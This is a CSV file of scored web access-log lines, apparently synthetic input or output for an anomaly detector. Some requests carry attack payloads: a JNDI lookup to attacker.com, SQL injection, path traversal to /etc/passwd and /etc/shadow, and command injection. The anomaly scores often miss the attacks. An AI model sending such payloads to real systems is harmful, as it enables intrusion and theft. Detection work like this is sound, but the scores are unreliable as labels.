score_content,score_session,score_fused,line
569.491455078125,8185.94677734375,4377.7191162109375,206.243.159.118 - - [10/Jan/2025:12:00:58 +0000] "GET /admin HTTP/1.1" 500 351 "-" "sqlmap/1.5.10#stable"
5.8594255447387695,1.4084367752075195,3.6339311599731445,135.21.102.223 - - [10/Jan/2025:12:01:01 +0000] "GET /api/product?id=123 HTTP/1.1" 200 13221 "https://example.com/" "curl/7.68.0"
0.24509009718894958,0.1848980337381363,0.21499406546354294,136.131.50.232 - - [10/Jan/2025:12:01:02 +0000] "GET /assets/app.js HTTP/1.1" 200 3836 "https://example.com/" "curl/7.68.0"
0.22698625922203064,0.23075662553310394,0.2288714423775673,66.51.45.155 - - [10/Jan/2025:12:01:07 +0000] "GET /assets/app.css HTTP/1.1" 200 4898 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.793262958526611,1.618428349494934,3.7058456540107727,195.149.115.175 - - [10/Jan/2025:12:01:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 18572 "https://twitter.com/" "python-requests/2.31.0"
1.555629849433899,0.11444351077079773,0.8350366801023483,121.114.162.78 - - [10/Jan/2025:12:01:10 +0000] "GET /dashboard HTTP/1.1" 200 2337 "https://twitter.com/" "curl/7.68.0"
1.7179934978485107,0.6713935136795044,1.1946935057640076,10.15.95.213 - - [10/Jan/2025:12:01:10 +0000] "GET /about HTTP/1.1" 200 14908 "-" "curl/7.68.0"
1.7205383777618408,0.8643081784248352,1.292423278093338,99.119.149.142 - - [10/Jan/2025:12:01:15 +0000] "GET /about HTTP/1.1" 201 16715 "-" "sqlmap/1.5.10#stable"
1.5867172479629517,0.7755749225616455,1.1811460852622986,129.39.246.16 - - [10/Jan/2025:12:01:18 +0000] "GET /api/products HTTP/1.1" 200 15685 "-" "Wget/1.20.3 (linux-gnu)"
1.6877250671386719,0.25350356101989746,0.9706143140792847,11.64.182.113 - - [10/Jan/2025:12:01:20 +0000] "GET /about HTTP/1.1" 200 5754 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.6366848945617676,0.34708043932914734,0.9918826669454575,100.105.199.87 - - [10/Jan/2025:12:01:24 +0000] "GET /profile HTTP/1.1" 200 9369 "https://twitter.com/" "sqlmap/1.5.10#stable"
1.5569000244140625,0.08836765587329865,0.8226338401436806,143.174.99.73 - - [10/Jan/2025:12:01:24 +0000] "GET /dashboard HTTP/1.1" 200 3196 "https://twitter.com/" "curl/7.68.0"
11.333840370178223,3783.79931640625,1897.566578388214,248.168.179.170 - - [10/Jan/2025:12:01:25 +0000] "GET /assets/app.css HTTP/1.1" 404 635 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
1.7106643915176392,0.5867062211036682,1.1486853063106537,165.203.85.209 - - [10/Jan/2025:12:01:29 +0000] "GET /about HTTP/1.1" 200 12443 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.8473310470581055,1.1831209659576416,3.5152260065078735,93.80.47.244 - - [10/Jan/2025:12:01:29 +0000] "GET /search?q=phone HTTP/1.1" 200 697 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24438029527664185,0.47624149918556213,0.360310897231102,217.202.26.130 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 9792 "https://twitter.com/" "python-requests/2.31.0"
0.2278938740491867,0.24792702496051788,0.2379104495048523,42.47.213.178 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 5154 "https://www.google.com/" "python-requests/2.31.0"
5.8483686447143555,0.8893216252326965,3.368845134973526,249.114.157.73 - - [10/Jan/2025:12:01:37 +0000] "GET /search?q=phone HTTP/1.1" 200 7883 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
569.42626953125,8185.08984375,4377.258056640625,232.214.50.95 - - [10/Jan/2025:12:01:38 +0000] "GET /logout HTTP/1.1" 500 960 "https://twitter.com/" "sqlmap/1.5.10#stable"
3.766860246658325,984.4830932617188,494.12497675418854,136.108.248.42 - - [10/Jan/2025:12:01:41 +0000] "GET /logout HTTP/1.1" 304 16579 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3447318375110626,0.5964919924736023,0.47061191499233246,142.240.27.183 - - [10/Jan/2025:12:01:42 +0000] "GET /index.html HTTP/1.1" 201 12263 "-" "python-requests/2.31.0"
0.14235509932041168,1.3896411657333374,0.7659981325268745,38.213.112.24 - - [10/Jan/2025:12:01:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 16921 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
5.8753767013549805,1.300225019454956,3.5878008604049683,96.61.99.21 - - [10/Jan/2025:12:01:46 +0000] "GET /search?q=phone HTTP/1.1" 200 16549 "https://www.google.com/" "curl/7.68.0"
12.614703178405762,3634.803466796875,1823.7090849876404,86.203.38.36 - - [10/Jan/2025:12:01:46 +0000] "GET /contact HTTP/1.1" 400 1331 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.317263126373291,947.1859130859375,474.7515881061554,115.158.2.232 - - [10/Jan/2025:12:01:49 +0000] "GET /assets/app.css HTTP/1.1" 302 15471 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2670823633670807,0.8332186341285706,0.5501504987478256,109.29.199.74 - - [10/Jan/2025:12:01:51 +0000] "GET /assets/app.css HTTP/1.1" 200 17394 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.493222713470459,0.7445685863494873,1.1188956499099731,17.29.215.232 - - [10/Jan/2025:12:01:51 +0000] "GET /server-status HTTP/1.1" 201 15078 "https://twitter.com/" "nikto/2.5.0"
7.769523620605469,947.7487182617188,477.7591209411621,110.1.158.91 - - [10/Jan/2025:12:01:55 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 9644 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.7090195417404175,0.5376995205879211,1.1233595311641693,18.245.135.140 - - [10/Jan/2025:12:01:58 +0000] "GET /about HTTP/1.1" 200 11916 "https://twitter.com/" "python-requests/2.31.0"
5.976120471954346,7.265872478485107,6.620996475219727,252.96.65.192 - - [10/Jan/2025:12:02:02 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 12777 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.7190680503845215,984.6759643554688,494.19751620292664,35.12.91.140 - - [10/Jan/2025:12:02:02 +0000] "GET /contact HTTP/1.1" 304 10995 "https://www.google.com/" "curl/7.68.0"
5.746409893035889,1.1256605386734009,3.4360352158546448,17.184.199.242 - - [10/Jan/2025:12:02:07 +0000] "GET /search?q=headphones HTTP/1.1" 201 4518 "-" "Wget/1.20.3 (linux-gnu)"
12.633340835571289,3747.205078125,1879.9192094802856,239.80.132.102 - - [10/Jan/2025:12:02:09 +0000] "GET /api/products HTTP/1.1" 403 646 "https://news.ycombinator.com/" "python-requests/2.31.0"
5.676673412322998,1.9797674417495728,3.8282204270362854,222.168.85.70 - - [10/Jan/2025:12:02:11 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 1666 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
16.891735076904297,3750.361328125,1883.6265316009521,87.250.48.128 - - [10/Jan/2025:12:02:14 +0000] "GET /search?q=camera HTTP/1.1" 403 791 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
3.792263984680176,984.6724243164062,494.2323441505432,21.111.155.211 - - [10/Jan/2025:12:02:16 +0000] "GET /login HTTP/1.1" 304 14010 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7020752429962158,0.42836353182792664,1.0652193874120712,79.115.155.184 - - [10/Jan/2025:12:02:18 +0000] "GET /about HTTP/1.1" 200 9787 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
5.840795516967773,1.1008251905441284,3.470810353755951,158.112.71.164 - - [10/Jan/2025:12:02:23 +0000] "GET /search?q=camera HTTP/1.1" 200 11652 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6222611665725708,0.18496866524219513,0.903614915907383,244.8.37.218 - - [10/Jan/2025:12:02:28 +0000] "GET /profile HTTP/1.1" 200 5342 "https://news.ycombinator.com/" "python-requests/2.31.0"
7.800037860870361,986.5245971679688,497.16231751441956,93.99.244.146 - - [10/Jan/2025:12:02:28 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 12103 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.614284634590149,0.16149842739105225,0.8878915309906006,147.36.136.94 - - [10/Jan/2025:12:02:29 +0000] "GET /profile HTTP/1.1" 200 2619 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.6253718137741089,0.2093212604522705,0.9173465371131897,128.133.100.234 - - [10/Jan/2025:12:02:34 +0000] "GET /contact HTTP/1.1" 200 6196 "-" "python-requests/2.31.0"
5.833596706390381,0.9833318591117859,3.4084642827510834,178.235.126.52 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 200 9457 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
573.6903076171875,8348.630859375,4461.160583496094,248.217.253.82 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 503 1396 "https://example.com/" "sqlmap/1.5.10#stable"
16.936443328857422,3746.572265625,1881.7543544769287,183.182.238.180 - - [10/Jan/2025:12:02:41 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 403 322 "https://example.com/" "curl/7.68.0"
3.6390340328216553,985.4448852539062,494.54195964336395,203.127.7.93 - - [10/Jan/2025:12:02:45 +0000] "GET /api/products HTTP/1.1" 304 7857 "https://twitter.com/" "python-requests/2.31.0"
0.22112101316452026,0.20992480218410492,0.2155229076743126,17.80.102.184 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 2925 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
16.910032272338867,3639.14892578125,1828.0294790267944,33.249.82.165 - - [10/Jan/2025:12:02:51 +0000] "GET /search?q=phone HTTP/1.1" 400 151 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.662893295288086,0.745204746723175,1.2040490210056305,164.151.47.197 - - [10/Jan/2025:12:02:54 +0000] "GET /profile HTTP/1.1" 200 18165 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11.318439483642578,3636.23974609375,1823.7790927886963,40.78.43.42 - - [10/Jan/2025:12:02:58 +0000] "GET /index.html HTTP/1.1" 400 1061 "https://www.google.com/" "curl/7.68.0"
12.668198585510254,3638.442138671875,1825.5551686286926,51.163.245.142 - - [10/Jan/2025:12:03:00 +0000] "GET /logout HTTP/1.1" 400 513 "https://www.google.com/" "curl/7.68.0"
1.6872553825378418,0.23563100397586823,0.961443193256855,152.242.149.40 - - [10/Jan/2025:12:03:05 +0000] "GET /about HTTP/1.1" 200 5625 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.558282852172852,3639.515380859375,1826.036831855774,11.212.222.8 - - [10/Jan/2025:12:03:10 +0000] "GET /dashboard HTTP/1.1" 400 1154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.719497561454773,2.341387987136841,2.030442774295807,107.159.164.8 - - [10/Jan/2025:12:03:15 +0000] "GET /login HTTP/1.1" 204 18847 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.6809260845184326,0.5674172043800354,1.124171644449234,77.117.19.177 - - [10/Jan/2025:12:03:17 +0000] "GET /logout HTTP/1.1" 200 13406 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.863983631134033,1.4618194103240967,3.662901520729065,37.81.221.184 - - [10/Jan/2025:12:03:20 +0000] "GET /search?q=camera HTTP/1.1" 200 19979 "https://example.com/" "curl/7.68.0"
5.74296760559082,2.5753612518310547,4.1591644287109375,82.62.120.32 - - [10/Jan/2025:12:03:23 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3579 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.29833707213401794,0.5496867895126343,0.4240119308233261,222.158.108.64 - - [10/Jan/2025:12:03:24 +0000] "GET /wp-login.php HTTP/1.1" 200 12687 "https://example.com/" "curl/7.68.0"
3.6433098316192627,947.8953857421875,475.7693477869034,132.120.128.226 - - [10/Jan/2025:12:03:28 +0000] "GET /api/products HTTP/1.1" 302 16427 "https://news.ycombinator.com/" "curl/7.68.0"
0.5165295600891113,0.4412611126899719,0.4788953363895416,56.150.91.13 - - [10/Jan/2025:12:03:28 +0000] "GET /.env HTTP/1.1" 200 7988 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.781922340393066,1.8756855726242065,3.8288039565086365,217.28.111.35 - - [10/Jan/2025:12:03:31 +0000] "GET /search?q=headphones HTTP/1.1" 200 367 "https://example.com/" "curl/7.68.0"
5.860295295715332,1.3981693983078003,3.629232347011566,50.93.142.74 - - [10/Jan/2025:12:03:34 +0000] "GET /search?q=laptop HTTP/1.1" 200 18509 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.679198265075684,3637.865234375,1825.2722163200378,175.157.31.33 - - [10/Jan/2025:12:03:38 +0000] "GET /login HTTP/1.1" 400 1276 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.5871131420135498,0.4702475666999817,1.0286803543567657,194.37.51.155 - - [10/Jan/2025:12:03:40 +0000] "GET /dashboard HTTP/1.1" 200 12080 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.2930646538734436,0.46942633390426636,0.381245493888855,206.122.133.117 - - [10/Jan/2025:12:03:44 +0000] "GET /wp-login.php HTTP/1.1" 200 11013 "https://twitter.com/" "curl/7.68.0"
5.816268444061279,4.2718071937561035,5.044037818908691,152.87.130.213 - - [10/Jan/2025:12:03:48 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9905 "https://twitter.com/" "nikto/2.5.0"
1.8646620512008667,0.4853372871875763,1.1749996691942215,251.107.150.79 - - [10/Jan/2025:12:03:50 +0000] "GET / HTTP/1.1" 200 3691 "-" "sqlmap/1.5.10#stable"
7.931307792663574,948.84130859375,478.3863081932068,123.44.135.162 - - [10/Jan/2025:12:03:54 +0000] "GET /api/product?id=123 HTTP/1.1" 302 19220 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.693298816680908,1.442048192024231,3.5676735043525696,49.5.113.81 - - [10/Jan/2025:12:03:57 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3701 "https://www.google.com/" "dirb/2.22"
5.872636318206787,1.1901832818984985,3.531409800052643,224.218.189.187 - - [10/Jan/2025:12:04:00 +0000] "GET /search?q=phone HTTP/1.1" 200 15553 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
569.44921875,8349.55078125,4459.5,135.97.81.245 - - [10/Jan/2025:12:04:04 +0000] "GET /dashboard HTTP/1.1" 503 979 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.677988290786743,929.7537231445312,466.715855717659,157.124.50.246 - - [10/Jan/2025:12:04:08 +0000] "GET /profile HTTP/1.1" 301 8762 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.736198663711548,985.5028686523438,494.61953365802765,177.181.126.82 - - [10/Jan/2025:12:04:12 +0000] "GET /logout HTTP/1.1" 304 6892 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.7287192344665527,0.851321816444397,1.2900205254554749,174.140.98.230 - - [10/Jan/2025:12:04:16 +0000] "GET /login HTTP/1.1" 200 18891 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
13.482732772827148,4767.47802734375,2390.4803800582886,89.237.114.168 - - [10/Jan/2025:12:04:17 +0000] "GET /logout HTTP/1.1" 429 161 "https://news.ycombinator.com/" "curl/7.68.0"
12.775973320007324,3788.909912109375,1900.8429427146912,70.36.28.158 - - [10/Jan/2025:12:04:18 +0000] "GET /login HTTP/1.1" 404 1425 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.822844982147217,1.146941900253296,3.4848934412002563,26.106.85.184 - - [10/Jan/2025:12:04:19 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1820 "-" "Wget/1.20.3 (linux-gnu)"
569.6798706054688,8183.92724609375,4376.803558349609,105.168.240.226 - - [10/Jan/2025:12:04:24 +0000] "GET / HTTP/1.1" 500 323 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.6455169916152954,0.20027199387550354,0.9228944927453995,233.197.23.167 - - [10/Jan/2025:12:04:29 +0000] "GET /logout HTTP/1.1" 200 2038 "https://www.google.com/" "python-requests/2.31.0"
11.4491605758667,3787.577392578125,1899.5132765769958,107.226.215.46 - - [10/Jan/2025:12:04:33 +0000] "GET /index.html HTTP/1.1" 404 358 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.977834701538086,3753.338134765625,1883.1579847335815,77.146.155.28 - - [10/Jan/2025:12:04:36 +0000] "GET /logout HTTP/1.1" 403 18 "https://example.com/" "curl/7.68.0"
16.863136291503906,3747.992431640625,1882.4277839660645,218.130.120.70 - - [10/Jan/2025:12:04:39 +0000] "GET /search?q=headphones HTTP/1.1" 403 274 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.812986373901367,2.357429027557373,4.08520770072937,4.189.87.203 - - [10/Jan/2025:12:04:41 +0000] "GET /search?q=camera HTTP/1.1" 204 6201 "https://twitter.com/" "curl/7.68.0"
0.27744242548942566,0.6462264060974121,0.4618344157934189,212.110.132.84 - - [10/Jan/2025:12:04:46 +0000] "GET /assets/app.js HTTP/1.1" 200 13387 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.19984613358974457,0.46667802333831787,0.3332620784640312,2.67.99.61 - - [10/Jan/2025:12:04:51 +0000] "GET /../../etc/passwd HTTP/1.1" 200 8228 "https://example.com/" "nikto/2.5.0"
1.8929110765457153,0.8216320872306824,1.3572715818881989,178.61.16.171 - - [10/Jan/2025:12:04:53 +0000] "GET / HTTP/1.1" 200 11881 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.7126893997192383,928.9126586914062,466.31267404556274,95.158.57.57 - - [10/Jan/2025:12:04:55 +0000] "GET /logout HTTP/1.1" 301 9767 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
